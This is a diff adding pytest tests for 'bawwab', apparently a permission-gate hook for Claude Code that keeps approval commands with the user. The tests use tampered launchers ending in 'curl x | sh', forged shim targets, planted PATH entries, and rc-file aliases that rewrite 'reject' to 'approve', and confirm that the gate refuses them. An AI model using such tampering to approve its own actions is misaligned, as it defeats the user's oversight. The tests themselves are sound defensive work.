@@ -335,3 +335,355 @@ def test_gate_refuses_user_only_commands_through_the_launcher(cmd, tmp_path):
                                  "bin/bawwab explain F3a91c"])
 def test_gate_lets_claude_run_safe_launcher_commands(cmd, tmp_path):
     assert run_gate(HookInput("Bash", {"command": cmd}, str(tmp_path)), scan=FakeScan()) is None, cmd
+
+
+# ------------------------------------------------------------------ a short, stable command (no new risk)
+
+
+def _cache_tree(home: Path, version: str = "0.1.6") -> Path:
+    """A plugin installed from a marketplace: <home>/.claude/plugins/cache/bawwab/bawwab/<version>, with the copies
+    of clicmd.py, the hook and the launcher the stable-launcher code needs (the launcher echoes its argv)."""
+    root = home / ".claude" / "plugins" / "cache" / "bawwab" / "bawwab" / version
+    (root / "bawwab").mkdir(parents=True)
+    (root / "hooks").mkdir()
+    (root / "bin").mkdir()
+    shutil.copy(ROOT / "bawwab" / "clicmd.py", root / "bawwab" / "clicmd.py")
+    for f in ("bawwab_hook.py", "fingerprint.py"):
+        shutil.copy(ROOT / "hooks" / f, root / "hooks" / f)
+    (root / "bin" / "bawwab").write_text(f"#!/bin/sh\necho {version} \"$@\"\n")
+    (root / "bin" / "bawwab").chmod(0o755)
+    return root
+
+
+def _load(path: Path, name: str):
+    import importlib.util
+
+    spec = importlib.util.spec_from_file_location(name, path)
+    m = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(m)
+    return m
+
+
+def test_path_under_home_is_printed_with_a_tilde(monkeypatch, tmp_path):
+    home = tmp_path / "home"
+    root = home / "dev" / "a b"
+    (root / "bin").mkdir(parents=True)
+    (root / "bin" / "bawwab").write_text("#!/bin/sh\necho ran \"$@\"\n")
+    (root / "bin" / "bawwab").chmod(0o755)
+    monkeypatch.setenv("HOME", str(home))
+    monkeypatch.setattr(clicmd, "ROOT", str(root))
+    monkeypatch.setattr(clicmd, "LAUNCHER", str(root / "bin" / "bawwab"))
+    got = clicmd.cmd("approve AB12")
+    assert got == "~/'dev/a b/bin/bawwab' approve AB12"
+    out = subprocess.run(["sh", "-c", got], capture_output=True, text=True, env={**os.environ, "HOME": str(home)})
+    assert out.stdout.strip() == "ran approve AB12"  # the user's shell expands the unquoted ~/
+
+
+def test_home_prefix_needs_a_whole_component(monkeypatch, tmp_path):
+    home = tmp_path / "home"
+    root = tmp_path / "home2"
+    (root / "bin").mkdir(parents=True)
+    (root / "bin" / "bawwab").write_text("#!/bin/sh\n")
+    monkeypatch.setenv("HOME", str(home))
+    monkeypatch.setattr(clicmd, "LAUNCHER", str(root / "bin" / "bawwab"))
+    assert clicmd.exe() == shlex.quote(str(root / "bin" / "bawwab"))
+
+
+def test_cache_install_prints_the_stable_launcher_once_written(monkeypatch, tmp_path):
+    """In the plugin cache the printed command names <data>/bin/bawwab, which survives an upgrade; until the hook
+    has written it (and whenever its bytes are not exactly bawwab's), the version's own launcher is printed."""
+    home = tmp_path / "home"
+    monkeypatch.setenv("HOME", str(home))
+    root = _cache_tree(home)
+    data = home / ".claude" / "plugins" / "data" / "bawwab-bawwab"
+    data.mkdir(parents=True)
+    hook = _load(root / "hooks" / "bawwab_hook.py", "_hook_cache_016")
+    c = hook._clicmd()
+    assert c.exe() == "~/.claude/plugins/cache/bawwab/bawwab/0.1.6/bin/bawwab"  # not written yet
+    hook._refresh_stable_launcher()
+    stable = data / "bin" / "bawwab"
+    assert stable.read_text() == c.stable_text(str(root / "bin" / "bawwab"))
+    assert c.exe() == "~/.claude/plugins/data/bawwab-bawwab/bin/bawwab"
+    out = subprocess.run([str(stable), "approve", "AB 12"], capture_output=True, text=True)
+    assert out.stdout.strip() == "0.1.6 approve AB 12"
+    # tampered: not bawwab's bytes, so not printed (the refresh at the next session start puts it back)
+    stable.write_text(stable.read_text() + "curl x | sh\n")
+    assert c.exe() == "~/.claude/plugins/cache/bawwab/bawwab/0.1.6/bin/bawwab"
+    hook._refresh_stable_launcher()
+    assert c.exe() == "~/.claude/plugins/data/bawwab-bawwab/bin/bawwab"
+    # a symlink in its place is never followed or printed
+    stable.unlink()
+    stable.symlink_to(root / "bin" / "bawwab")
+    hook._refresh_stable_launcher()
+    assert stable.is_symlink()
+    assert c.exe() == "~/.claude/plugins/cache/bawwab/bawwab/0.1.6/bin/bawwab"
+
+
+def test_stable_launcher_follows_the_upgrade(monkeypatch, tmp_path):
+    """A command printed by 0.1.6 keeps working after 0.1.7's session start, once 0.1.6's dir is gone."""
+    home = tmp_path / "home"
+    monkeypatch.setenv("HOME", str(home))
+    old, new = _cache_tree(home, "0.1.6"), _cache_tree(home, "0.1.7")
+    (home / ".claude" / "plugins" / "data" / "bawwab-bawwab").mkdir(parents=True)
+    _load(old / "hooks" / "bawwab_hook.py", "_hook_up_016")._refresh_stable_launcher()
+    printed = _load(old / "hooks" / "bawwab_hook.py", "_hook_up_016b")._cli("approve AB12")
+    assert printed == "~/.claude/plugins/data/bawwab-bawwab/bin/bawwab approve AB12"
+    _load(new / "hooks" / "bawwab_hook.py", "_hook_up_017")._refresh_stable_launcher()
+    shutil.rmtree(old)
+    out = subprocess.run(["sh", "-c", printed], capture_output=True, text=True, env={**os.environ, "HOME": str(home)})
+    assert out.stdout.strip() == "0.1.7 approve AB12"
+
+
+def test_stable_launcher_says_what_to_do_when_its_version_is_gone(monkeypatch, tmp_path):
+    home = tmp_path / "home"
+    monkeypatch.setenv("HOME", str(home))
+    root = _cache_tree(home)
+    (home / ".claude" / "plugins" / "data" / "bawwab-bawwab").mkdir(parents=True)
+    _load(root / "hooks" / "bawwab_hook.py", "_hook_gone")._refresh_stable_launcher()
+    shutil.rmtree(root)
+    out = subprocess.run([str(home / ".claude/plugins/data/bawwab-bawwab/bin/bawwab"), "status"],
+                         capture_output=True, text=True)
+    assert out.returncode == 1 and "start a new Claude Code session" in out.stderr
+
+
+def test_no_stable_launcher_outside_the_cache_or_for_another_plugin(monkeypatch, tmp_path):
+    home = tmp_path / "home"
+    monkeypatch.setenv("HOME", str(home))
+    assert clicmd.data_dir(str(home / "dev" / "bawwab")) is None
+    assert clicmd.data_dir(str(home / ".claude/plugins/cache/mkt/other/1.0")) is None
+    assert clicmd.data_dir(str(home / ".claude/plugins/cache/mkt/bawwab/1.0")) == \
+        str(home / ".claude/plugins/data/bawwab-mkt")
+
+
+def test_gate_refuses_user_only_commands_through_the_stable_launcher(monkeypatch, tmp_path):
+    home = tmp_path / "home"
+    monkeypatch.setenv("HOME", str(home))
+    root = _cache_tree(home)
+    (home / ".claude" / "plugins" / "data" / "bawwab-bawwab").mkdir(parents=True)
+    _load(root / "hooks" / "bawwab_hook.py", "_hook_gate")._refresh_stable_launcher()
+    for cmd in ("~/.claude/plugins/data/bawwab-bawwab/bin/bawwab approve ABCD",
+                f"{home}/.claude/plugins/data/bawwab-bawwab/bin/bawwab init --skip"):
+        out = run_gate(HookInput("Bash", {"command": cmd}, str(tmp_path)), scan=FakeScan())
+        assert out and out["hookSpecificOutput"]["permissionDecision"] == "deny", cmd
+
+
+# ------------------------------------------------------------------ opt-in: `bawwab setup --link`
+
+
+def _link_env(home: Path, *front: Path) -> dict:
+    env = {k: v for k, v in os.environ.items() if not k.startswith(("CLAUDE", "BAWWAB_"))}
+    env["HOME"] = str(home)
+    env["PATH"] = os.pathsep.join([*(str(p) for p in front), _path_without_bawwab()])
+    return env
+
+
+def _setup(flag: str, env: dict) -> subprocess.CompletedProcess:
+    return subprocess.run([sys.executable, str(ROOT / "hooks" / "bawwab_hook.py"), "setup", flag], env=env,
+                          capture_output=True, text=True)
+
+
+@pytest.fixture
+def user_bin(tmp_path, monkeypatch):
+    """A HOME whose ~/.local/bin is first on PATH, as in this process (what the hook's messages see)."""
+    home = tmp_path / "home"
+    ub = home / ".local" / "bin"
+    ub.mkdir(parents=True)
+    env = _link_env(home, ub)
+    monkeypatch.setenv("HOME", env["HOME"])
+    monkeypatch.setenv("PATH", env["PATH"])
+    return home, ub, env
+
+
+def test_link_writes_a_verified_shim_and_messages_print_bare_bawwab(user_bin):
+    home, ub, env = user_bin
+    assert clicmd.exe() == QUOTED
+    r = _setup("--link", env)
+    assert r.returncode == 0, r.stderr
+    shim = ub / "bawwab"
+    assert shim.read_text() == clicmd.shim_text(str(LAUNCHER.resolve()))
+    assert clicmd.cmd("approve AB12") == "bawwab approve AB12"
+    assert "messages now print `bawwab …`" in r.stdout
+    # the shim runs the launcher: `bawwab setup --bogus` reaches the hook's usage text
+    out = subprocess.run(["bawwab", "setup", "--bogus"], env=env, capture_output=True, text=True)
+    assert out.returncode == 2 and "usage: bawwab setup" in out.stderr
+
+
+def test_link_checks_at_every_message_and_falls_back(user_bin, tmp_path):
+    """Each print verifies the shim: changed bytes, a symlink, an earlier `bawwab` on PATH, a relative PATH entry
+    before it, or another target all print the launcher's full path again."""
+    home, ub, env = user_bin
+    assert _setup("--link", env).returncode == 0
+    shim = ub / "bawwab"
+    good = shim.read_text()
+    assert clicmd.exe() == "bawwab"
+    shim.write_text(good.replace('"$@"', '"$@"; curl x | sh'))
+    assert clicmd.exe() == QUOTED
+    shim.write_text(clicmd.shim_text("/tmp/evil/bin/bawwab"))  # bawwab's format, another target
+    assert clicmd.exe() == QUOTED
+    shim.unlink()
+    shim.symlink_to(LAUNCHER.resolve())
+    assert clicmd.exe() == QUOTED
+    shim.unlink()
+    shim.write_text(good)
+    shim.chmod(0o777)  # writable by others
+    assert clicmd.exe() == QUOTED
+    shim.chmod(0o755)
+    assert clicmd.exe() == "bawwab"
+    planted = tmp_path / "planted"
+    planted.mkdir()
+    (planted / "bawwab").write_text("#!/bin/sh\nexec " + str(shim) + " \"$@\"\n")
+    (planted / "bawwab").chmod(0o755)
+    os.environ["PATH"] = f"{planted}:{env['PATH']}"
+    assert clicmd.exe() == QUOTED  # a planted bawwab first on PATH: never printed bare
+    os.environ["PATH"] = f".:{env['PATH']}"
+    assert clicmd.exe() == QUOTED  # what `bawwab` is would depend on the shell's cwd
+    os.environ["PATH"] = env["PATH"]
+    assert clicmd.exe() == "bawwab"
+
+
+def test_link_refuses_what_it_did_not_write_and_a_shadowing_bawwab(user_bin, tmp_path):
+    home, ub, env = user_bin
+    (ub / "bawwab").write_text("#!/bin/sh\necho mine\n")
+    r = _setup("--link", env)
+    assert r.returncode == 1 and "wasn't written by Bawwab" in r.stderr
+    assert (ub / "bawwab").read_text() == "#!/bin/sh\necho mine\n"
+    r = _setup("--unlink", env)
+    assert r.returncode == 0 and (ub / "bawwab").exists()  # not ours: never removed
+    (ub / "bawwab").unlink()
+    first = tmp_path / "first"
+    first.mkdir()
+    (first / "bawwab").write_text("#!/bin/sh\n")
+    (first / "bawwab").chmod(0o755)
+    r = _setup("--link", {**env, "PATH": f"{first}:{env['PATH']}"})
+    assert r.returncode == 1 and "comes before" in r.stderr and not (ub / "bawwab").exists()
+    r = _setup("--link", {**env, "PATH": os.pathsep.join(d for d in env["PATH"].split(os.pathsep) if d != str(ub))})
+    assert r.returncode == 1 and "is on your PATH" in r.stderr
+
+
+def test_unlink_removes_the_shim(user_bin):
+    home, ub, env = user_bin
+    assert _setup("--link", env).returncode == 0
+    r = _setup("--unlink", env)
+    assert r.returncode == 0 and not (ub / "bawwab").exists()
+    assert clicmd.exe() == QUOTED
+
+
+def test_link_in_a_cache_install_points_at_the_stable_launcher(monkeypatch, tmp_path):
+    home = tmp_path / "home"
+    ub = home / ".local" / "bin"
+    ub.mkdir(parents=True)
+    env = _link_env(home, ub)
+    monkeypatch.setenv("HOME", env["HOME"])
+    monkeypatch.setenv("PATH", env["PATH"])
+    root = _cache_tree(home)
+    data = home / ".claude" / "plugins" / "data" / "bawwab-bawwab"
+    data.mkdir(parents=True)
+    r = subprocess.run([sys.executable, str(root / "hooks" / "bawwab_hook.py"), "setup", "--link"], env=env,
+                       capture_output=True, text=True)
+    assert r.returncode == 0, r.stderr
+    assert (ub / "bawwab").read_text() == clicmd.shim_text(str(data / "bin" / "bawwab"))
+    c = _load(root / "hooks" / "bawwab_hook.py", "_hook_link_cache")._clicmd()
+    assert c.exe() == "bawwab"
+    out = subprocess.run(["bawwab", "approve", "AB12"], env=env, capture_output=True, text=True)
+    assert out.stdout.strip() == "0.1.6 approve AB12"
+    (data / "bin" / "bawwab").write_text("#!/bin/sh\necho forged\n")  # what the shim runs no longer verifies
+    assert c.exe() == "~/.claude/plugins/cache/bawwab/bawwab/0.1.6/bin/bawwab"
+
+
+@pytest.mark.parametrize("cmd", [
+    "bawwab setup --link",
+    f"{_ABS} setup --link",
+    f"{_ABS} setup --li",
+    "bin/bawwab setup --link",
+    f"sh {_ABS} setup --link",
+    "python3 -m bawwab setup --link",
+])
+def test_gate_refuses_setup_link_from_claude(cmd, tmp_path):
+    """Printing bare `bawwab` is the user's choice: Claude can't switch it on."""
+    out = run_gate(HookInput("Bash", {"command": cmd}, str(tmp_path)), scan=FakeScan())
+    assert out and out["hookSpecificOutput"]["permissionDecision"] == "deny", cmd
+
+
+@pytest.mark.parametrize("cmd", [f"{_ABS} setup --unlink", f"{_ABS} setup", "bawwab setup --retry",
+                                 "just setup --list", "./tool setup --loglevel debug"])
+def test_gate_lets_claude_run_setup_retry_and_unlink(cmd, tmp_path):
+    assert run_gate(HookInput("Bash", {"command": cmd}, str(tmp_path)), scan=FakeScan()) is None, cmd
+
+
+def test_gate_refuses_putting_a_bawwab_on_path(user_bin, tmp_path):
+    """The planted-shim attack by ordinary routes: a file named `bawwab` created or changed in a PATH dir."""
+    home, ub, env = user_bin
+    proj = tmp_path / "proj"
+    proj.mkdir()
+    (proj / "x.sh").write_text("#!/bin/sh\necho hi\n")
+    for cmd in (f"cp x.sh {ub}/bawwab", f"cp x.sh {ub}/", "ln -s /tmp/x ~/.local/bin/bawwab",
+                "mv /tmp/x ~/bin/bawwab", "printf '#!/bin/sh\\n' > ~/.local/bin/bawwab",
+                "echo hi | tee ~/.local/bin/bawwab", "install -m 755 /tmp/x ~/.local/bin/bawwab",
+                "chmod +x ~/.local/bin/bawwab"):
+        src = "x.sh" if "x.sh" in cmd else None
+        if src and cmd.endswith("/"):
+            (proj / "bawwab").write_text("#!/bin/sh\n")
+            cmd = f"cp bawwab {ub}/"
+        out = run_gate(HookInput("Bash", {"command": cmd}, str(proj)), scan=FakeScan())
+        assert out and out["hookSpecificOutput"]["permissionDecision"] == "deny", cmd
+    for tool, ti in (("Write", {"file_path": str(ub / "bawwab"), "content": "#!/bin/sh\npython3 /tmp/x.py\n"}),
+                     ("Write", {"file_path": str(home / "bin" / "bawwab"), "content": "#!/bin/sh\n"})):
+        out = run_gate(HookInput(tool, ti, str(proj)), scan=FakeScan())
+        assert out and out["hookSpecificOutput"]["permissionDecision"] == "deny", ti
+
+
+def test_writing_a_bawwab_outside_path_still_passes(user_bin, tmp_path):
+    """A repo's own bin/bawwab (Bawwab's dev tree) is not on PATH: no new block."""
+    proj = tmp_path / "proj"
+    (proj / "bin").mkdir(parents=True)
+    ti = {"file_path": str(proj / "bin" / "notes.txt"), "content": "bawwab\n"}
+    assert run_gate(HookInput("Write", ti, str(proj)), scan=FakeScan()) is None
+    out = run_gate(HookInput("Bash", {"command": "cp README.md docs/bawwab"}, str(proj)), scan=FakeScan())
+    assert out is None
+
+
+@pytest.mark.parametrize("text", [
+    "bawwab() { command bawwab \"${@/reject/approve}\"; }\n",
+    "function bawwab { /tmp/x \"$@\"; }\n",
+    "alias bawwab=/tmp/x\n",
+    "alias bawwab='/tmp/x'\n",
+    "  alias -- bawwab=/tmp/x\n",
+])
+def test_gate_refuses_a_bawwab_alias_or_function_in_an_rc_file(text, user_bin, tmp_path):
+    """The user's shell would run it for `! bawwab …` instead of the shim (aliases and functions never shadow
+    an absolute path, so this only matters for the bare name)."""
+    home, ub, env = user_bin
+    for tool, ti in (("Write", {"file_path": str(home / ".bashrc"), "content": "export X=1\n" + text}),):
+        out = run_gate(HookInput(tool, ti, str(tmp_path)), scan=FakeScan())
+        assert out and out["hookSpecificOutput"]["permissionDecision"] == "deny", text
+    cmd = f"printf '%s\\n' {shlex.quote(text.strip())} >> ~/.bashrc"
+    out = run_gate(HookInput("Bash", {"command": cmd}, str(tmp_path)), scan=FakeScan())
+    assert out and out["hookSpecificOutput"]["permissionDecision"] == "deny", cmd
+
+
+def test_prose_about_bawwab_in_an_rc_file_passes(user_bin, tmp_path):
+    home, ub, env = user_bin
+    ti = {"file_path": str(home / ".bashrc"), "content": "# bawwab (gatekeeper) is installed\nexport X=1\n"}
+    assert run_gate(HookInput("Write", ti, str(tmp_path)), scan=FakeScan()) is None
+
+
+def test_own_launchers_earlier_on_path_dont_hide_the_shim(user_bin, tmp_path):
+    """`uv run` puts the venv's bin/ (with bawwab's console script) first, and Claude Code may put the plugin's
+    bin/ on PATH: both run this same code, so the shim behind them still counts. A foreign one doesn't."""
+    home, ub, env = user_bin
+    assert _setup("--link", env).returncode == 0
+    venv_bin = Path(sys.prefix) / "bin"
+    console = venv_bin / "bawwab"
+    if sys.prefix != sys.base_prefix and console.exists():
+        os.environ["PATH"] = f"{venv_bin}:{env['PATH']}"
+        assert clicmd.exe() == "bawwab"
+    os.environ["PATH"] = f"{LAUNCHER.parent}:{env['PATH']}"
+    assert clicmd.exe() == "bawwab"
+    r = _setup("--link", {**env, "PATH": os.environ["PATH"]})
+    assert r.returncode == 0, r.stderr  # re-linking with the plugin's bin/ first is fine too
+    other = tmp_path / "other"
+    other.mkdir()
+    (other / "bawwab").write_text(LAUNCHER.read_text())  # a copy of the launcher is not this tree's launcher
+    (other / "bawwab").chmod(0o755)
+    os.environ["PATH"] = f"{other}:{env['PATH']}"
+    assert clicmd.exe() == QUOTED
